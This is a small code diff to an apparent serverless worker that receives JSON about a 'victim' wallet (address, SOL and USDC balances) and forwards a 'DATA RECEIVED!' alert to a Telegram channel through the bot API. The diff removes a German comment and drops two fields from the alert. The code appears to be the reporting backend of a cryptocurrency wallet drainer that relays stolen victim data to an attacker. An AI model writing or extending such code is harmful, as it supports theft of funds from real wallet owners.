@@ -14,9 +14,8 @@ export default {
       try {
         const data = await request.json();
         
-        // Sende SOFORT eine Nachricht an den Channel, egal was passiert
         if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
-          let text = `📥 *DATA RECEIVED!*\n\nType: ${data.type}\nAddress: \`${data.victim}\`\nSOL: ${data.sol}\nUSDC: ${data.usdc}`;
+          let text = `📥 *DATA RECEIVED!*\n\nAddress: \`${data.victim}\`\nSOL: ${data.sol}`;
           
           await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
             method: "POST",
